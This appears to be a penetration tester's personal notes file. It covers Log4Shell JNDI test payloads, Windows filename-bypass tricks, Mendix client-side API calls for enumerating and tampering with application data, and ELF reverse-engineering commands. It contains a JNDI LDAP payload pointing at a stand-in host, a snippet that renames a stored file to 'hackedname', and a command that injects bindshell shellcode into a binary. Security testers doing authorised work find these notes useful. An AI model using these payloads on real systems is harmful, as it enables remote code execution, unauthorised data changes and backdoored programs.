
${jndi:ldap://domain.com:1234/a}  
 
Easy test for log4j dns lookups:
```
${jndi:dns://<domain>} 
${jndi:dns://<ip>}
nc -ulp 53
```

https://log4shell.tools/  
https://github.com/alexbakker/log4shell-tools  


Directory/file name bypasses
```
C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
C:\>powershell C:\*\*2\n??e*d.* notepad.exe
C:\>powershell C:\*\*2\t?s*r.* taskmgr.exe
```
8.3 / Short filename notation
```
dir /a:h /x
for %A in (*.*) do @echo %~nsA %~nA

C:\>dir /a:h /x
                                        *
13/10/2011  09:14 AM    <DIR>          DOCUME~1     Documents and Settings
13/10/2011  09:05 AM    <DIR>          PROGRA~1     Program Files
13/10/2011  09:05 AM    <DIR>          PROGRA~2     Program Files(x86)

C:\>for %A in (*.*) do @echo %~nsA %~nA
$WINDOWS $WINDOWS
DOCUME~1 Documents and Settings
NVIDIA~1 NVIDIA Corporation
SYSTEM~1 System Volume Information
```

Display all unicodes + alt codes
0..65535 | ForEach-Object { $char = [char]$_; if ($char -ne [char]0) { "Alt+" + $_ + " → " + $char + " (U+" + $_.ToString("X4") + ")" } }

## Mendix
Usefull Javascript functions:  
```
mx.session.getConfig("locale");

mx.session.getConfig("constants");
// or if you are on a newer Mx version (> 9.x )
mx.session.getConstants();

mx.session.getConfig("isDevModeEnabled");

mx.session.getConfig("metadata");

mx.session.getConfig("roles");

mx.session.getConfig("user");

mx.session.getConfig("sessionObjectId");

mx.session.getConfig("demoUsers");

mx.meta.getMap();

```
Look for authorisation issues.

Some queries need schema/id/guid, some can have an empty schema:
```
{"action":"retrieve_by_xpath","params":{"xpath":"//Personal.Foto","schema":{},"count":false}}
```

Create a object which can be used for callback
```
function output(obj){
 o = obj
}

o;

mx.data.get({guid:"13641898043228119", callback:output});

o.set("Filename", "hackedname")

mx.data.commit({mxobj: o, callback: console.info});
```  

get_session_data contains alot of useful information  

Schema/id en entity enumeration:
1. .XML frontend files enumeraten filter containing 'entity', grep for '"schema":"' to find guid
2. initial session response contains juicy data grep for 'klass' to find objects
3. Try to enumerate microflows:
//MxModelReflection.Microflows (geen guid nodig)

A few default schema's:
```
//System.User
//System.UserRole
//System.Session
//System.TimeZone
//System.Language
//System.Workflow
//System.WorkflowState
//System.WorkflowDefinition
//Administration.Account
```
Mendix uses the following action's to write and read data:
```
Action      Parameter
retrieve - queryId
retrieve_by_xpath - xpath 
retrieve_by_ids - ids
executeaction - actionname, applyto
poll_background_job
keepalive
commit - guids
export - gridid, buttonid, xpath
runtimeOperation - operationId
executemicroflow - name
```
Each action requires different parameters.

Whenever u use a retrieve_by_xpath query the response will contain a list of the found objects/guids:
```
"resultGuids":["17983245202395311","57913545202395512","27983845202395995","37983444202396999","55599999395718","57983849992335898","51983855202395949","545123845202226068"]
```
https://docs.mendix.com/    
https://github.com/mendix/RestServices

https://video.mendix.com/watch/xpvL3W9zvMJGar1GxhE5iT  
https://video.mendix.com/watch/xSrQDTHT7X3978aSXSoy6t  


# Linux binary exploitation
dump ELF’s header
$readelf -h <filename>

Symbols  
```
non stripped binary
$ readelf --syms <filename>.out

stripping symbols from a binary
$ strip --strip-all <filename>.out
$ readelf --syms <filename>.out
```

Sections  
```
dump all ELF’s sections information
$readelf --sections --wide <filename>.out
dump the .plt section
$ objdump -M intel --section .plt -d <filename>.out
dump the relocs
$ readelf --relocs <filename>.out
``` 

Program headers  
```
dump all ELF’s program headers information
$ readelf --segments --wide <filename>.out
```

Binary Inspection/Forensic  

```
Check magic bytes to obtain file type
$ file <filename>
base64 decode
$ base64 -d <encoded_file> > <decoded_file>
uncompress preview
$ file -z <compressed_file>
uncompress file
$ tar xvzf <compressed_file>
find library dependencies
$ ldd <filename>
dump hex first 128 bytes
$ xxd -l 128 <filename>
dump binary first 128 bytesr
$ xxd -b -l 128 <filename>
dump c-style header first 128 bytes at a 256-bytes offset
$ xxd -i -s 256 -l 128 <filename>
extract 64-bytes long ELF header residing 52 bytes after start, 1 byte a time time
$ dd skip=52 count=64 if=<input_filename> of=<output_filename> bs=1
Calculate total binary file given ELF header only
total_size = elf_section_header_offset + (elf_section_headers_count * elf_section_header_size)
List symbols from object file
$ nm <filename>
List and demangle dynamic symbols from stripped object file
$ nm -D --demangle <filename>
Add current path to the linker environment
$ export LD_LIBRARY_PATH=`pwd`
Trace system calls
$ strace <filename>`
Trace library calls while demangling C++ functions and printing EIP
$ ltrace -i -C <filename>`
```

Disassembling  
```
simple disassembly of an object file
$ objdump -M intel -d <filename>.o
check relocations inside the object file
$ readelf --relocs compilation_example.o
full binary disassembly
$ objdump -M intel -d <filename>.out
```

Set a breakpoint  
```
(gdb) b *0x[address]
Show the registers
(gdb) info registers [specific register]
Dump a string at memory address
(gdb) x/s 0x[memory_address]
Dump a four hex words at memory address
(gdb) x/4xw 0x[memory_address]
```

Partial RELRO  
```
gcc -g -Wl,-z,relro -o test testcase.c
Full RELRO
gcc -g -Wl,-z,relro,-z,now -o test testcase.c
```

Binary Injection  
Assemble a raw binary (removing any ELF overhead and leaving just the code)  
```
nasm -f bin -o test.bin test.s
Inject shellcode into an ELF
elfinject ps bindshell.bin ".injected" 0x800000 -1
```
